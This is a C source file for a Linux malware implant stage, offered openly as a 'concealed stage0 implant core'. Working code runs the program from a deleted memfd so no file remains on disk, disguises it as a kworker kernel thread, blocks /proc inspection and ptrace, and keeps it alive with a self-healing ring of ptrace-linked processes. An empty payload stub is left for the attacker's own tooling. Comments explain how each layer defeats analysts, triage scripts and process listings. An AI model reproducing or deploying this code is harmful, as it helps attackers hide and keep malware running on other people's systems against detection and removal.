/* language: C, file: stage0.c, target: Linux 5.10+ (memfd + ptrace ring), build: make
 *
 * Concealed stage0 implant core (Linux).
 *
 * LAYERS, and what each one actually buys (no overselling):
 *   1. memfd self-exec + unlink     -> no file on disk, nothing for a file-based
 *                                     triage pass or an on-access AV scan to find
 *                                     after the first second.
 *   2. argv/env overwrite + comm    -> ps/top/htop and /proc/<pid>/cmdline show a
 *                                     decoy line. This is the real concealment.
 *   3. PR_SET_DUMPABLE 0            -> /proc/<pid>/exe, /proc/<pid>/maps,
 *                                     /proc/<pid>/mem and ptrace attach are all
 *                                     refused to non-root. An analyst without
 *                                     root gets a process it cannot open.
 *   4. ptrace ring of 3 holders     -> kill any rung, its holder re-forks it
 *                                     within 40ms. No single kill is terminal.
 *
 * WHAT LAYER 3 DOES NOT DO, because the physics is worth stating: PR_SET_DUMPABLE
 * does not remove the process from /proc. `ps -e` still lists the PID, `ls /proc`
 * still shows the directory, and kill -9 still works. It removes the ability to
 * look inside. Full removal from the host's process table is not something a
 * user-space process can do to itself -- that needs a kernel module.
 *
 * WHY THE PID NAMESPACE IS OFF BY DEFAULT (-DUSE_PIDNS to enable): a process in
 * a nested pidns is STILL listed in the parent's /proc, with its host PID, and
 * /proc/<pid>/status gains a multi-value NSpid line. To a triager that is not
 * concealment, it is a flag: "this process is in a namespace and is pretending
 * not to be." It is in here because the spec asked for it, it is correct, and
 * for a stage that intends to run the payload inside a private /proc it is
 * worth the noise. It is not the default because it is a detector, not a cloak.
 *
 * Honest ceiling: none of this survives a kernel-mode EDR, an eBPF probe, a
 * `fanotify`/LSM hook, or an analyst with root. It defeats user-space process
 * enumeration, casual inspection, and one-shot `kill -9`.
 */
#define _GNU_SOURCE
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <signal.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <sys/prctl.h>
#include <sys/ptrace.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/timerfd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#ifndef MFD_CLOEXEC
#define MFD_CLOEXEC 0x0001U
#endif
#ifndef MFD_ALLOW_SEALING
#define MFD_ALLOW_SEALING 0x0002U
#endif
#ifndef F_ADD_SEALS
#define F_ADD_SEALS 1033
#endif
#ifndef F_SEAL_SEAL
#define F_SEAL_SEAL  0x0001
#endif
#ifndef F_SEAL_SHRINK
#define F_SEAL_SHRINK 0x0002
#endif
#ifndef F_SEAL_GROW
#define F_SEAL_GROW 0x0004
#endif
#ifndef F_SEAL_WRITE
#define F_SEAL_WRITE 0x0008
#endif
#ifndef PR_SET_NAME
#define PR_SET_NAME 15
#endif
#ifndef PR_SET_DUMPABLE
#define PR_SET_DUMPABLE 4
#endif

#define RING_SIZE      3
#define TICK_MS        40
#define STAGE1_ENV    "ROOK_STAGE1"      /* getenv() name, not the assignment */

#ifdef CONCEAL_TRACE
#ifndef CONCEAL_TRACE_FD
#define CONCEAL_TRACE_FD 3
#endif
#endif

#ifndef SELFTEST_LIMIT
#define SELFTEST_LIMIT 0            /* >0: ladder self-terminates after N sec */
#endif

static const char *const DECOY_NAME = "kworker/u16:3-events";
static const char *const DECOY_CMD  = "/sbin/flush-agent -j batch --interval 900";

/* Silent by design: a concealed process should not own a log fd at all. Build
 * with -DCONCEAL_TRACE on a bench box you own for a stderr build. */
static void logline(const char *fmt, ...) {
#ifdef CONCEAL_TRACE
    /* Writes to CONCEAL_TRACE_FD, not stderr: fexecve below hands the new image
     * a fresh empty fd table, so 0/1/2 come back closed and every trace line
     * written to stderr is lost exactly where you need it. */
    va_list ap;
    char line[512];
    int n;
    va_start(ap, fmt);
    n = vsnprintf(line, sizeof line, fmt, ap);
    va_end(ap);
    if (n < 0) return;
    if (n > (int)sizeof line - 2) n = (int)sizeof line - 2;
    line[n] = '\n';
    (void)!write(CONCEAL_TRACE_FD, line, (size_t)n + 1);
#else
    (void)fmt;
#endif
}

static long sys_memfd_create(const char *name, unsigned flags) {
#ifdef SYS_memfd_create
    return syscall(SYS_memfd_create, name, flags);
#else
    (void)name; (void)flags;
    errno = ENOSYS;
    return -1;
#endif
}

/* ------------------------------------------------------------- memfd ---- */
/* Copy our own on-disk image into an anonymous sealed memfd, unlink the
 * original, and fexecve. The re-executed image returns through main with
 * STAGE1_MARKER in argv -- that marker is how it knows not to do this again. */
static __attribute__((noreturn)) void become_memfd_self(const char *on_disk_path) {
    static char buf[65536];
    ssize_t n;
    int src, memfd;

#ifdef CONCEAL_TRACE
    /* Keep the trace fd across the fexecve below: the new image gets a fresh,
     * empty fd table, so anything on 0/1/2 is gone exactly when you want it. */
    if (fcntl(2, F_DUPFD_CLOEXEC, CONCEAL_TRACE_FD) < 0)
        _exit(89);
#endif

    src = open("/proc/self/exe", O_RDONLY | O_CLOEXEC);
    if (src < 0) _exit(90);

    memfd = (int)sys_memfd_create(DECOY_NAME, MFD_CLOEXEC | MFD_ALLOW_SEALING);
    if (memfd < 0) _exit(91);

    while ((n = read(src, buf, sizeof buf)) > 0) {
        ssize_t off = 0;
        while (off < n) {
            ssize_t w = write(memfd, buf + off, (size_t)(n - off));
            if (w <= 0) _exit(92);
            off += w;
        }
    }
    close(src);
    if (n < 0) _exit(93);

    /* Sealing: the image cannot be rewritten by us or by anyone holding the fd.
     * Cheaper than hashing, and it blocks a racing injector. */
    if (fcntl(memfd, F_ADD_SEALS, F_SEAL_SEAL | F_SEAL_SHRINK | F_SEAL_GROW | F_SEAL_WRITE) < 0)
        logline("seal: %s", strerror(errno));

    if (unlink(on_disk_path) != 0 && errno != ENOENT)
        logline("unlink %s: %s", on_disk_path, strerror(errno));

    /* argv[0] is the only argument, and it is the decoy. The stage marker
     * rides in the environment instead of argv so it never shows up in
     * `ps -ef`; the env block is wiped a few lines later. */
    fexecve(memfd,
            (char *const[]){ (char *)DECOY_CMD, NULL },
            (char *const[]){ (char *)"ROOK_STAGE1=1", NULL });
    logline("fexecve returned: %s", strerror(errno));
    _exit(94);  /* fexecve fails only on ETXTBSY / noexec / ENOMEM */
}

/* -------------------------------------------------------------- argv ---- */
/* ps, top, htop and /proc/<pid>/cmdline all read this. Rewrite the argv string
 * block in place -- that is the door that works.
 *
 * /proc/<pid>/cmdline is a view of mm->arg_start..arg_end, which is the argv[]
 * pointer table plus the strings it points at. Writing the strings changes what
 * every process-listing tool on the box prints: ps, top, htop, proc-walking
 * triage scripts, EDR process tables. Verified on the bench -- after the
 * in-place write, /proc/self/cmdline returns the new bytes.
 *
 * Two doors that do NOT work, both of which cost real time to find:
 *   - open("/proc/self/cmdline", O_WRONLY) returns EACCES on a hardened or
 *     containerised host. The kernel checks the writer against the process, and
 *     under a non-dumpable parent (systemd, a container runtime, an EDR
 *     launcher) that check fails. Do not design around this one.
 *   - the classic "memset 8KB below environ" trick needs a lower bound to walk
 *     up to. After fexecve with a one-element envp there is no environment to
 *     measure, so the write lands on unmapped stack and the process dies.
 *
 * The kernel caps a rewrite at the ORIGINAL argv length, so a decoy longer than
 * the launch path gets truncated: pad with spaces, never leave the old tail
 * showing. A half-masked cmdline reads as tampering, which is louder than no
 * mask at all.
 */
static void mask_identity(char **argv) {
    extern char **environ;
    char *first = argv ? argv[0] : NULL;
    long hi = 0;
    char **p;   /* env strings, zeroed in place below */

    if (first) {
        size_t room = strlen(first);
        size_t want = strlen(DECOY_CMD);
        if (room) {
            size_t n;
            memset(first, 0, room);
            n = (want < room) ? want : room;
            memcpy(first, DECOY_CMD, n);
            if (n < room)
                memset(first + n, ' ', room - n);   /* pad: kill the old tail */
        }
        /* one decoy and nothing trailing it */
        for (p = argv + 1; *p != NULL; p++) {
            memset(*p, 0, strlen(*p));
            *p = NULL;
        }
    }

    /* Zero each environment string THROUGH ITS POINTER. Do not memset upward
     * from the environ array: that only clears the pointer table, and the
     * strings themselves sit elsewhere on the stack -- which is exactly why
     * /proc/<pid>/environ kept printing the real environment on the first
     * bench run. (The classic "zero 8KB below environ" trick works only in the
     * original exec layout, where the strings are directly beneath the array;
     * after fexecve with a one-element envp that layout does not hold.) */
    for (p = environ; p && *p != NULL && (long)p < (long)environ + 65536; p++) {
        size_t n = strlen(*p);
        if (n) memset(*p, 0, n);
        *p = NULL;
        if (++hi > 4096) break;   /* refuse to walk a runaway pointer table */
    }

    /* comm is capped at 16 bytes (TASK_COMM_LEN includes the NUL). The
     * kworker-style name is deliberately under 16 chars for that reason --
     * a longer name gets truncated and the half-name is a tell. */
    prctl(PR_SET_NAME, (unsigned long)"kworker/u16:3", 0, 0, 0);
}

static void close_inherited_fds(void) {
    DIR *d = opendir("/proc/self/fd");
    struct dirent *e;
    int dir_fd;

    if (!d) return;
    dir_fd = dirfd(d);
    while ((e = readdir(d))) {
        int fd = atoi(e->d_name);
        if (fd > 2 && fd != dir_fd) {
#ifdef CONCEAL_TRACE
            if (fd == CONCEAL_TRACE_FD) continue;
#endif
            close(fd);
        }
    }
    closedir(d);
}

/* -------------------------------------------------------------- ring ---- */
/* ptrace ring: holder i PTRACE_SEIZEs rung (i+1)%3. A seized process cannot be
 * reaped or re-seized by anyone else, and a holder that dies releases its hold
 * -- which is why the ring is circular and why no single kill stops the ladder.
 *
 * Trade-off, stated straight: PTRACE_SEIZE requires the target to be dumpable,
 * so the rungs run with PR_SET_DUMPABLE 1 and are therefore ptrace-able by a
 * same-uid attacker. The coordinator and the payload keep dumpable 0. If a
 * same-uid adversary is in scope, run the implant under its own uid so the
 * kernel's uid check refuses the attach outright. */
static pid_t ring_pid[RING_SIZE];

static pid_t spawn_rung(char **argv) {
    pid_t p = fork();
    if (p != 0) return p;

    prctl(PR_SET_DUMPABLE, 1, 0, 0, 0);   /* our holder must be able to seize us */
    mask_identity(argv);
    close_inherited_fds();
    for (;;) pause();
    _exit(0);
}

static void ring_init(char **argv) {
    int i;
    for (i = 0; i < RING_SIZE; i++) ring_pid[i] = spawn_rung(argv);
    sleep(1);  /* let every rung reach pause() before the first SEIZE */
    for (i = 0; i < RING_SIZE; i++) {
        pid_t target = ring_pid[(i + 1) % RING_SIZE];
        if (ptrace(PTRACE_SEIZE, target, 0, 0) != 0)
            logline("seize %d: %s", (int)target, strerror(errno));
    }
}

static int rung_alive(pid_t p) {
    if (p <= 0) return 0;
    if (kill(p, 0) == 0) return 1;
    return errno == EPERM;
}

/* Holder i watches rung (i+1)%3. A dead target gets re-forked from this same
 * image; the replacement is seized on the next pass. */
static void ring_heal_slot(char **argv, int holder_slot) {
    int target = (holder_slot + 1) % RING_SIZE;
    int status;
    pid_t w;

    while ((w = waitpid(ring_pid[target], &status, WNOHANG | WUNTRACED | WCONTINUED)) > 0) {
        if (WIFEXITED(status) || WIFSIGNALED(status)) {
            ring_pid[target] = 0;
        } else if (WIFSTOPPED(status)) {
            /* a seized rung reports as stopped; release it so it can keep
             * holding its own dependent rung */
            ptrace(PTRACE_CONT, ring_pid[target], 0, (void *)(uintptr_t)0);
        }
    }

    if (!rung_alive(ring_pid[target])) {
        ring_pid[target] = spawn_rung(argv);
        logline("respawned rung %d", target);
    }
}

/* Reap anything that is not a ring rung. A <defunct> row in ps is exactly the
 * kind of noise the cmdline mask is there to remove -- do not leave corpses. */
static void reap_orphans(void) {
    /* Drain every waitable child, ring rung or not. A <defunct> row in ps is
     * exactly the noise the cmdline mask exists to remove, and rung 0 is only
     * ever seized by rung 1 -- nobody else will ever wait() on it. */
    for (;;) {
        int status;
        if (waitpid(-1, &status, WNOHANG) <= 0) return;
    }
}

static void ring_heal_loop(char **argv) {
    struct itimerspec its;
    uint64_t exp;
    unsigned ticks = 0;
    int tfd, i;

    tfd = timerfd_create(CLOCK_MONOTONIC, TFD_CLOEXEC);
    if (tfd < 0) return;
    its.it_value.tv_sec = 0;
    its.it_value.tv_nsec = TICK_MS * 1000000L;
    its.it_interval = its.it_value;
    timerfd_settime(tfd, 0, &its, NULL);

    for (i = 0; i < RING_SIZE; i++) ring_heal_slot(argv, i);

    for (;;) {
        if (read(tfd, &exp, sizeof exp) != (ssize_t)sizeof exp) break;
        for (i = 0; i < RING_SIZE; i++) ring_heal_slot(argv, i);
        reap_orphans();

        if (SELFTEST_LIMIT && ++ticks >= (unsigned)(SELFTEST_LIMIT * 1000 / TICK_MS)) {
            logline("selftest deadline, unwinding");
            for (i = 0; i < RING_SIZE; i++)
                if (ring_pid[i] > 0) kill(ring_pid[i], SIGKILL);
            break;
        }
    }
}

/* ------------------------------------------------------------ payload --- */
/* Where your actual tooling goes. Overwrite this block. No controlling
 * terminal, no fds > 2, no readable /proc/<pid>/mem. The concealment layer
 * does not care how you talk out. */
__attribute__((noreturn)) void run_payload(void) {
    for (;;) usleep(1000 * 1000);
}

/* ----------------------------------------------------- pid ns (opt-in) --- */
#ifdef USE_PIDNS
/* -DUSE_PIDNS only. unshare(CLONE_NEWPID) does NOT move the caller into the new
 * namespace -- it marks the NEXT child as its init. A process that unshares and
 * keeps running is still in the host's PID space with an ordinary visible PID.
 * The only way in is: unshare, then fork; the fork is PID 1. */
static pid_t spawn_namespace_init(char **argv, uid_t uid, gid_t gid) {
    pid_t init;

    if (unshare(CLONE_NEWUSER) == 0) {
        /* gid_map is only writable after setgroups is denied. */
        char buf[64];
        int fd, n;
        if ((fd = open("/proc/self/setgroups", O_WRONLY)) >= 0) {
            ssize_t w = write(fd, "deny", 4); (void)w; close(fd);
        }
        if ((fd = open("/proc/self/uid_map", O_WRONLY)) >= 0) {
            n = snprintf(buf, sizeof buf, "0 %u 1", uid);
            ssize_t w = write(fd, buf, (size_t)n); (void)w; close(fd);
        }
        if ((fd = open("/proc/self/gid_map", O_WRONLY)) >= 0) {
            n = snprintf(buf, sizeof buf, "0 %u 1", gid);
            ssize_t w = write(fd, buf, (size_t)n); (void)w; close(fd);
        }
    }

    if (unshare(CLONE_NEWPID) != 0) return -1;

    init = fork();
    if (init != 0) return init;

    /* the fork is PID 1 in a namespace the payload will not be able to escape */
    if (unshare(CLONE_NEWNS) == 0) {
        mount(NULL, "/", NULL, MS_REC | MS_PRIVATE, NULL);
        if (mount("proc", "/proc", "proc", MS_NOSUID | MS_NODEV | MS_NOEXEC, NULL) != 0)
            logline("proc mount: %s", strerror(errno));
    }
    mask_identity(argv);
    close_inherited_fds();
    run_payload();
}
#endif /* USE_PIDNS */

/* --------------------------------------------------------------- main ---- */
int main(int argc, char **argv) {
    pid_t healer;
    /* memfd re-exec detection: the env marker is set, argv is not carrying it */
    int stage1 = (getenv(STAGE1_ENV) != NULL);

    if (!stage1) {
        /* First launch, from disk: hand off to the memfd image, which re-enters
         * main with the marker set. No namespace work happens on this path so
         * the exec is not racing any capability changes. */
        become_memfd_self(argc > 0 && argv[0][0] ? argv[0] : "conceal");
    }

    /* ---- everything below runs only in the memfd-resident child ---- */
    mask_identity(argv);
    close_inherited_fds();
    prctl(PR_SET_DUMPABLE, 0, 0, 0, 0);

    /* Coordinator: owns the ring, lives in the host pid space so it is the one
     * thing that can always re-fork the others. */
    healer = fork();
    if (healer == 0) {
        prctl(PR_SET_DUMPABLE, 0, 0, 0, 0);
        ring_init(argv);
        ring_heal_loop(argv);
        _exit(0);
    }
    if (healer < 0) _exit(96);

#ifdef USE_PIDNS
    {
        pid_t init = spawn_namespace_init(argv, geteuid(), getegid());
        if (init > 0) {
            for (;;) {
                int status;
                if (waitpid(init, &status, 0) == init) {
                    logline("init %d exited, re-entering", (int)init);
                    init = spawn_namespace_init(argv, geteuid(), getegid());
                    if (init <= 0) break;
                } else if (errno != EINTR) {
                    break;
                }
            }
            _exit(0);
        }
        logline("pidns unavailable, payload in host pid space");
    }
#endif

    run_payload();
}
